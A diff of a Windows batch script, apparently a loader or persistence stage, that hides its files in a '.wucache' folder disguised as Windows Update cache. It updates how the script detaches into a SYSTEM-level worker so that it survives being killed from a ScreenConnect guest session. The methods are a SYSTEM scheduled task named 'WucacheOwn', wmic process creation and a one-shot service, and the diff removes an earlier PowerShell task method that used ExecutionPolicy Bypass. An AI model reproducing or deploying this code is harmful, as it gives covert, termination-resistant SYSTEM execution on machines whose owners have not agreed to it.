@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O12 - audited: schtasks quoting, x86 loop, sc/task detect
+REM OWN BUILD 20260802O13 - schtasks-first detach; no quote mangle
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -23,7 +23,7 @@ if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O12 ===
+  echo === OWN BUILD 20260802O13 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -61,64 +61,19 @@ if /I not "%~1"=="_RUN" (
   set "DETACH_OK=0"
   set "RUNNER=%BOOT%\own_run.cmd"
   if exist "%SELF%" set "RUNNER=%SELF%"
-  copy /y "%RUNNER%" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
-  set "FLAT=%SystemRoot%\Temp\wucache_own.cmd"
 
-  REM Method A: one-shot SERVICE as SYSTEM (flat path; 1053 still means spawned)
-  sc.exe stop WucacheOwn >nul 2>&1
-  sc.exe delete WucacheOwn >nul 2>&1
-  sc.exe create WucacheOwn binPath= "cmd.exe /c %FLAT% _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
+  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
+  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
+  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c %RUNNER% _RUN" >"%BOOT%\detach.task" 2>&1
   if not errorlevel 1 (
-    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
+    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
     if not errorlevel 1 (
       set "DETACH_OK=1"
-      echo detach_via=sc_service>>"%LOG%"
-    )
-  )
-  if "!DETACH_OK!"=="0" (
-    REM 1053 = service did not respond - process may still have started
-    findstr /I /C:"1053" "%BOOT%\detach.scstart" >nul 2>&1 && (
-      set "DETACH_OK=1"
-      echo detach_via=sc_service_1053>>"%LOG%"
-    )
-  )
-  if "!DETACH_OK!"=="0" (
-    findstr /I /C:"SUCCESS" "%BOOT%\detach.scstart" >nul 2>&1 && (
-      set "DETACH_OK=1"
-      echo detach_via=sc_service_startmsg>>"%LOG%"
+      echo detach_via=schtasks_root>>"%LOG%"
     )
   )
 
-  REM Method B: PowerShell Register-ScheduledTask (locale-safe, no /SD)
-  REM New-ScheduledTaskAction needs only ONE level of quoting for cmd /c
-  if "!DETACH_OK!"=="0" (
-    powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
-      "$ErrorActionPreference='SilentlyContinue';" ^
-      "$a=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument ('/c \"%RUNNER%\" _RUN');" ^
-      "$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;" ^
-      "$t=New-ScheduledTaskTrigger -Once -At ((Get-Date).AddDays(365));" ^
-      "Register-ScheduledTask -TaskName 'WucacheOwnPS' -Action $a -Principal $p -Trigger $t -Force | Out-Null;" ^
-      "Start-ScheduledTask -TaskName 'WucacheOwnPS'" >"%BOOT%\detach.ps" 2>&1
-    if not errorlevel 1 (
-      set "DETACH_OK=1"
-      echo detach_via=ps_task>>"%LOG%"
-    )
-  )
-
-  REM Method C: plain schtasks root (no /SD)
-  if "!DETACH_OK!"=="0" (
-    schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
-    schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c ""%RUNNER%"" _RUN" >"%BOOT%\detach.task" 2>&1
-    if not errorlevel 1 (
-      schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
-      if not errorlevel 1 (
-        set "DETACH_OK=1"
-        echo detach_via=schtasks_root>>"%LOG%"
-      )
-    )
-  )
-
-  REM Method D: wmic (often absent on Win11)
+  REM Method B: wmic (often absent on Win11)
   if "!DETACH_OK!"=="0" (
     wmic process call create "cmd.exe /c \"%RUNNER%\" _RUN" >"%BOOT%\detach.wmic" 2>&1
     findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
@@ -128,7 +83,19 @@ if /I not "%~1"=="_RUN" (
     )
   )
 
-  REM Method E: inline fallback (Guest may kill; better than nothing)
+  REM Method C: one-shot service (flat path; cmd not a service - last resort)
+  if "!DETACH_OK!"=="0" (
+    copy /y "%RUNNER%" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
+    sc.exe stop WucacheOwn >nul 2>&1
+    sc.exe delete WucacheOwn >nul 2>&1
+    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
+    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
+    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
+    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
+    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
+  )
+
+  REM Method D: inline fallback (Guest may kill; better than nothing)
   if "!DETACH_OK!"=="0" (
     echo detach_via=inline_fallback>>"%LOG%"
     echo WARNING: detach APIs failed - running inline (Guest may kill)
@@ -145,7 +112,7 @@ if /I not "%~1"=="_RUN" (
 )
 
 echo worker_start %DATE% %TIME%>>"%LOG%"
-echo === OWN WORKER 20260802O12 ===
+echo === OWN WORKER 20260802O13 ===
 if not exist "%LOG%" (
   set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
   if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
